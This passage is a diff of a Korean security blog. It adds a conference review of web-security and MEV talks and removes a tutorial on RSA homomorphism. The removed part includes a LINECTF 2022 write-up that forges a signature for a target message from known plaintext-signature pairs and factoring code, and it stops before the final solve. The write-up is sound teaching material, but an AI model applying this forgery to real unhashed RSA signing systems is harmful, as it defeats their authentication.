+&lt;p&gt;영상에서는 &lt;a href=&quot;https://youtu.be/6YgSTZ9i7Vk?t=7145&quot;&gt;1:59:05&lt;/a&gt;부터 재훈님의 발표가 시작됩니다. SSL을 통해 어떤 프로젝트를 진행하며 뭘 배워갈 수 있을지에 대해 궁금하신 분들은 한번 시청 해 보시는 것을 추천 드립니다! 👏&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/2022-06-08-homomorphism-in-rsa/011_dec.png&quot; alt=&quot;011_dec.png&quot; /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;open-모던-웹-환경에서의-버그케이스와-시큐어코딩&quot;&gt;[Open] 모던 웹 환경에서의 버그케이스와 시큐어코딩&lt;/h2&gt;
 
-&lt;p&gt;위와 같이 정말 간단하게 암/복호화가 수행되며 이에 대한 증명은 &lt;a href=&quot;https://en.wikipedia.org/wiki/RSA_(cryptosystem)#Proofs_of_correctness&quot;&gt;RSA 위키&lt;/a&gt;에 상세하게 나와있다.&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;
+    &lt;img src=&quot;/assets/2022-06-30-2022_3s_review/scyoon.jpg&quot; /&gt;&lt;br /&gt;
+    &lt;i&gt;발표 현장&lt;/i&gt;
+&lt;/p&gt;
 
-&lt;p&gt;(페르마 소정리, 오일러 정리를 이용하여 증명함)&lt;/p&gt;
+&lt;p&gt;네번째 발표는 저희 회사에서 많은 귀여움을 받고 있는 윤석찬 선임 연구원이 발표 해 주셨습니다.&lt;/p&gt;
 
-&lt;p&gt;이번에는 서명/검증이 어떻게 수행되는지 살펴보자.&lt;/p&gt;
+&lt;p&gt;윤석찬 연구원은 점점 스택이 높게 쌓여지는 모던 웹 어플리케이션에서 어떤 방식의 취약점을 찾을 수 있고, 이를 보완하는 방법에 대해 소개해 주셨습니다. 눈높이에 맞춰 하나씩 차근차근 알려주는 윤석찬 연구원의 스윗함에 빠질것 같았지만 겨우겨우 살아 돌아왔네요. 이 발표는 윤석찬 연구원이 직접 여러 프로젝트를 진행하며 배운 내용을 바탕으로 하고 있으니, 굉장히 practical한 발표라고 볼 수도 있겠네요!&lt;/p&gt;
 
-&lt;h2 id=&quot;rsa-서명&quot;&gt;RSA 서명&lt;/h2&gt;
+&lt;p&gt;백엔드, 프론트엔드에서 발생할 수 있는 일반적인 취약점들과, Django, React.js와 같은 특정한 플랫폼, 프레임워크에서만 발생할 수 있는 취약점들을 잘 알려 주셔서 너무 좋았다는 평이 가득합니다.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/2022-06-08-homomorphism-in-rsa/012_sign.png&quot; alt=&quot;012_sign.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;영상에서는 &lt;a href=&quot;https://youtu.be/6YgSTZ9i7Vk?t=10110&quot;&gt;2:48:30&lt;/a&gt;부터 석찬님의 발표가 시작됩니다. 평소 CTF를 통해 웹해킹은 어느정도 할 수 있지만, real-world에 입문하고 싶은 웹해커들에게 이 발표를 추천하는 바입니다. 🐞&lt;/p&gt;
 
-&lt;h2 id=&quot;rsa-검증&quot;&gt;RSA 검증&lt;/h2&gt;
+&lt;h2 id=&quot;open-mev&quot;&gt;[Open] MEV&lt;/h2&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/2022-06-08-homomorphism-in-rsa/013_verify.png&quot; alt=&quot;013_verify.png&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;
+    &lt;img src=&quot;/assets/2022-06-30-2022_3s_review/hjhan.jpg&quot; /&gt;&lt;br /&gt;
+    &lt;i&gt;발표 현장&lt;/i&gt;
+&lt;/p&gt;
 
-&lt;p&gt;암/복호화 과정과 순서만 바뀌었을 뿐 거의 동일하게 서명/검증이 수행되며 서명 시 개인키 d 를 이용해 서명이 되기 때문에 누구에게나 공개되는 e 를 이용해 메시지 m 을 복원할 수 없도록 해시 함수를 이용하여 메시지 m 의 해시값인 h 에 서명을 진행하도록 한다.&lt;/p&gt;
+&lt;p&gt;다섯번째 발표는 스틸리언의 한호정 연구원님이 진행해주셨습니다&lt;/p&gt;
 
-&lt;p&gt;메시지에 대한 서명이 완료되었다면 암호화된 메시지와 서명을 함께 전송하고 이후 검증 단계에서는 복호화된 메시지의 해시값과 s^e (mod n) 을 계산하여 나온 해시값 h 를 비교하여 일치하는지 확인하면 된다.&lt;/p&gt;
+&lt;p&gt;한호정 연구원님은 해당 발표에서 Blockchain에 대한 취약점 분석 외에 MEV(Miner Extractable Value)에 대해서 소개해주셨습니다
+Blockchain에 대한 Security Audit 산업이 MEV에 대한 research로도 발전할 것이라고 보는 한호정 연구원님의 견해는 매우 흥미로운것같습니다&lt;/p&gt;
 
-&lt;p&gt;이제 RSA 시스템에 대한 기본적인 개념을 배웠으니 흥미로운 속성 하나를 추가로 알려주려고 한다.&lt;/p&gt;
+&lt;p&gt;해당 발표에서는 MEV가 무엇인지, 또 MEV에는 어떠한 종류들이 있었는지, MEV를 완화시키거나 제거하기위해서 어떠한것들이 존재하는지, 마지막으로 한호정연구원님이 직접 MEV에 대해서 추출한 경험담에 대해서 소개합니다&lt;/p&gt;
 
-&lt;h2 id=&quot;준동형-사상homomorphism&quot;&gt;준동형 사상(Homomorphism)&lt;/h2&gt;
-
-&lt;p&gt;준동형 사상이란 대수학에서 구조상 닮은 두 대수 구조의 모든 연산 및 관계를 보존하는 경우를 말한다. 쉽게 말하자면, 어떠한 함수 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;f(x)&lt;/code&gt; 가 있다고 할 때 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;f(a * b)&lt;/code&gt; 가 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;f(a) * f(b)&lt;/code&gt; 와 같다는 것이다 (나눗셈도 마찬가지). 이는 신기하게도 RSA 에도 그대로 적용이 되는데 평문 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;m&lt;/code&gt; 이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a * b&lt;/code&gt; 라고 할 때 c ≡ m^e (mod n) 과 c ≡ (a * b)^e ≡ a^e * b^e (mod n) 이 서로 일치한다. 이는 서명에서도 마찬가지이며 예시를 통해 확인해보자.&lt;/p&gt;
-
-&lt;h2 id=&quot;예시&quot;&gt;예시&lt;/h2&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;임의의 소수 p, q 선택
-&lt;img src=&quot;/assets/2022-06-08-homomorphism-in-rsa/014_pq.png&quot; alt=&quot;014_pq.png&quot; /&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;n = p * q 계산
-&lt;img src=&quot;/assets/2022-06-08-homomorphism-in-rsa/015_npq3233.png&quot; alt=&quot;015_n=pq=3233.png&quot; /&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;오일러 피함수 계산
-&lt;img src=&quot;/assets/2022-06-08-homomorphism-in-rsa/016_phi(n).png&quot; alt=&quot;016_phi(n).png&quot; /&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;오일러 피함수와 서로소인 정수 e 선택
-&lt;img src=&quot;/assets/2022-06-08-homomorphism-in-rsa/017_e17.png&quot; alt=&quot;017_e=17.png&quot; /&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;개인키 d 계산
-&lt;img src=&quot;/assets/2022-06-08-homomorphism-in-rsa/018_private_key_d.png&quot; alt=&quot;018_private_key_d.png&quot; /&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;평문 m = a * b 라고 할 때 암호화 과정 비교
-&lt;img src=&quot;/assets/2022-06-08-homomorphism-in-rsa/019_enc.png&quot; alt=&quot;019_enc.png&quot; /&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;서명 과정 비교 (계산 편의를 위해 해시 함수는 미적용)
-&lt;img src=&quot;/assets/2022-06-08-homomorphism-in-rsa/020_sign.png&quot; alt=&quot;020_sign.png&quot; /&gt;&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;CTF 의 RSA 문제에서 위 속성을 이용한 문제가 꽤나 자주 출제되며 한번 실제로 출제된 문제를 풀어보며 어떤 식으로 응용되는지 살펴보자.&lt;/p&gt;
-
-&lt;h2 id=&quot;문제-풀이&quot;&gt;문제 풀이&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;LINECTF2022&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;문제명&lt;/th&gt;
-      &lt;th&gt;X Factor&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;난이도&lt;/td&gt;
-      &lt;td&gt;Easy&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;설명&lt;/td&gt;
-      &lt;td&gt;Decrypt it!&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;제공파일&lt;/td&gt;
-      &lt;td&gt;&lt;a href=&quot;/assets/2022-06-08-homomorphism-in-rsa/x_factor.md&quot;&gt;x_factor.md&lt;/a&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;먼저, 제공된 파일을 열어서 확인해보자.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;» Part 1&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;I&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;have&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;generated&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RSA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pair&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exponent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10001&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;modulus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xa9e7da28ebecf1f88efe012b8502122d70b167bdcfa11fd24429c23f27f55ee2cc3dcd7f337d0e630985152e114830423bfaf83f4f15d2d05826bf511c343c1b13bef744ff2232fb91416484be4e130a007a9b432225c5ead5a1faf02fa1b1b53d1adc6e62236c798f76695bb59f737d2701fe42f1fbf57385c29de12e79c5b3&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;첫번째로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSA 공개키 쌍(Public Exponent: e, Public Modulus: n)&lt;/code&gt;을 16진수 형태로 제공해주고 있다.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;» Part 2&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Here&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;are&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;some&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;known&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;signature&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pairs&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;I&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;generated&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x945d86b04b2e7c7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x17bb21949d5a0f590c6126e26dc830b51d52b8d0eb4f2b69494a9f9a637edb1061bec153f0c1d9dd55b1ad0fd4d58c46e2df51d293cdaaf1f74d5eb2f230568304eebb327e30879163790f3f860ca2da53ee0c60c5e1b2c3964dbcf194c27697a830a88d53b6e0ae29c616e4f9826ec91f7d390fb42409593e1815dbe48f7ed4&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5de2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x3ea73715787028b52796061fb887a7d36fb1ba1f9734e9fd6cb6188e087da5bfc26c4bfe1b4f0cbfa0d693d4ac0494efa58888e8415964c124f7ef293a8ee2bc403cad6e9a201cdd442c102b30009a3b63fa61cdd7b31ce9da03507901b49a654e4bb2b03979aea0fab3731d4e564c3c30c75aa1d079594723b60248d9bdde50&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xa16b201cdd42ad70da249&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9444e3fc71056d25489e5ce78c6c986c029f12b61f4f4b5cbd4a0ce6b999919d12c8872b8f2a8a7e91bd0f263a4ead8f2aa4f7e9fdb9096c2ea11f693f6aa73d6b9d5e351617d6f95849f9c73edabd6a6fde6cc2e4559e67b0e4a2ea8d6897b32675be6fc72a6172fd42a8a8e96adfc2b899015b73ff80d09c35909be0a6e13a&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6d993121ed46b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2b7a1c4a1a9e9f9179ab7b05dd9e0089695f895864b52c73bfbc37af3008e5c187518b56b9e819cc2f9dfdffdfb86b7cc44222b66d3ea49db72c72eb50377c8e6eb6f6cbf62efab760e4a697cbfdcdc47d1adc183cc790d2e86490da0705717e5908ad1af85c58c9429e15ea7c83ccf7d86048571d50bd721e5b3a0912bed7c&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x726fa7a7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xa7d5548d5e4339176a54ae1b3832d328e7c512be5252dabd05afa28cd92c7932b7d1c582dc26a0ce4f06b1e96814ee362ed475ddaf30dd37af0022441b36f08ec8c7c4135d6174167a43fa34f587abf806a4820e4f74708624518044f272e3e1215404e65b0219d42a706e5c295b9bf0ee8b7b7f9b6a75d76be64cf7c27dfaeb&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x31e828d97a0874cff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x67832c41a913bcc79631780088784e46402a0a0820826e648d84f9cc14ac99f7d8c10cf48a6774388daabcc0546d4e1e8e345ee7fc60b249d95d953ad4d923ca3ac96492ba71c9085d40753cab256948d61aeee96e0fe6c9a0134b807734a32f26430b325df7b6c9f8ba445e7152c2bf86b4dfd4293a53a8d6f003bf8cf5dffd&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x904a515&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x927a6ecd74bb7c7829741d290bc4a1fd844fa384ae3503b487ed51dbf9f79308bb11238f2ac389f8290e5bcebb0a4b9e09eda084f27add7b1995eeda57eb043deee72bfef97c3f90171b7b91785c2629ac9c31cbdcb25d081b8a1abc4d98c4a1fd9f074b583b5298b2b6cc38ca0832c2174c96f2c629afe74949d97918cbee4a&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;두번째로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(평문 - 서명)&lt;/code&gt; 쌍 7 개를 16진수 형태로 제공해주고 있다.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;» Part 3&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;**What is the signature of 0x686178656c696f6e?**
-
-Take the least significant 16 bytes of the signature, encode them in lowercase hexadecimal and format it as `LINECTF{sig_lowest_16_bytes_hex}` to obtain the flag.
-E.g. the last signature from the list above would become `LINECTF{174c96f2c629afe74949d97918cbee4a}`.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;세번째로 평문 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x686178656c696f6e&lt;/code&gt; 의 &lt;strong&gt;서명이 무엇인지&lt;/strong&gt; 맞춰보라며 서명의 16진수 형태의 마지막 16 바이트를 FLAG 형식에 맞춰 제출하면 된다고 한다.&lt;/p&gt;
-
-&lt;p&gt;현재 우리가 알고 있는 정보는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;공개키(e, n)&lt;/code&gt;와 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(평문 - 서명)&lt;/code&gt; 쌍 7개, 그리고 FLAG 인 서명을 구하기 위해 필요한 평문 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x686178656c696f6e&lt;/code&gt; 뿐이다. 의미를 알 수 없는 16진수 형태의 숫자로만 가득한 텍스트로부터 &lt;strong&gt;어떻게 개인키 d 도 없이 서명을 구할 수 있을까?&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;바로 위에서 배운 준동형 사상(Homomorphism)을 이용하여 풀면 된다.&lt;/p&gt;
-
-&lt;p&gt;먼저 평문 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x686178656c696f6e&lt;/code&gt; 을 소인수분해 해보면 다음과 같다 (SageMath 의 factor 함수):&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Implemented in SageMath
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x686178656c696f6e&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;# 7521425229691318126
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;factor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;# 2 * 197 * 947 * 2098711 * 9605087
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;위와 같이 5 개의 소인수의 곱으로 평문을 표현할 수 있다는 것을 알 수 있다. (m = a * b * c * d * e)&lt;/p&gt;
-
-&lt;p&gt;이번에는 주어졌던 (평문 - 서명) 쌍에서 평문들만 소인수분해 해보면 다음과 같다:&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;pt1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x945d86b04b2e7c7&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;pt2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5de2&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;pt3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xa16b201cdd42ad70da249&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;pt4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6d993121ed46b&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;pt5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x726fa7a7&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;pt6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x31e828d97a0874cff&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;pt7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x904a515&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;pts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pt1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pt2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pt3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pt4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pt5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pt6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pt7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pt&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;factor(pt&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;): &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;factor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-&lt;span class=&quot;s&quot;&gt;&apos;&apos;&apos;
-[+] Output: 
-pt1:  668178073886320583
-factor(pt1):  811 * 947^3 * 970111
-
-pt2:  24034
-factor(pt2):  2 * 61 * 197
-
-pt3:  12196433909207788967273033
-factor(pt3):  970111 * 2098711^2 * 2854343
-
-pt4:  1928075547694187
-factor(pt4):  947 * 970111 * 2098711
-
-pt5:  1919920039
-factor(pt5):  61 * 197^2 * 811
-
-pt6:  57538707471611677951
-factor(pt6):  2098711 * 2854343 * 9605087
-
-pt7:  151299349
-factor(pt7):  197 * 811 * 947
-&apos;&apos;&apos;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;신기하게도 몇몇 소인수들이 평문 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x686178656c696f6e&lt;/code&gt; 의 &lt;strong&gt;소인수들과 겹친다&lt;/strong&gt;는 것을 확인할 수 있다. 소인수가 겹치는게 뭐 어떻길래 그런걸까? 우리는 7 개의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(평문 - 서명)&lt;/code&gt; 쌍을 알고 있기 때문에 해당 평문을 &lt;strong&gt;잘 조합&lt;/strong&gt;해서 평문 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x686178656c696f6e&lt;/code&gt; 과 일치하게 만든다면 RSA 에서의 &lt;strong&gt;준동형 사상&lt;/strong&gt;으로 인해 평문 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x686178656c696f6e&lt;/code&gt; 에 개인키 d 를 이용하여 계산한 서명과 동일한 서명을 &lt;strong&gt;개인키 d 없이도 구할 수 있게 된다.&lt;/strong&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;이게-무슨-소리&quot;&gt;이게 무슨 소리?&lt;/h2&gt;
-
-&lt;p&gt;위에서 평문 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x686178656c696f6e&lt;/code&gt; 이 5 개의 소인수의 곱 형태로 표현이 가능하다는 것을 알았다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/2022-06-08-homomorphism-in-rsa/021_m_factor.png&quot; alt=&quot;021_m_factor.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;우리는 개인키 d 를 모르기 때문에 m 에 대한 서명을 구할 수 없지만, 7 개의 (평문 - 서명) 쌍을 알고 있고 각 평문의 소인수가 평문 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x686178656c696f6e&lt;/code&gt; 의 소인수와 겹치기 때문에 곱하기와 나누기를 적절히 이용하여 평문 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x686178656c696f6e&lt;/code&gt; 과 일치하는 수를 구할 수 있다면 해당 수를 구했을 때의 식과 동일하게 7 개의 서명에 적용하여 계산하면 평문 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x686178656c696f6e&lt;/code&gt; 에 개인키 d 를 이용하여 계산한 서명과 동일한 서명을 개인키 d 없이도 구할 수 있게 된다는 말이다.&lt;/p&gt;
-
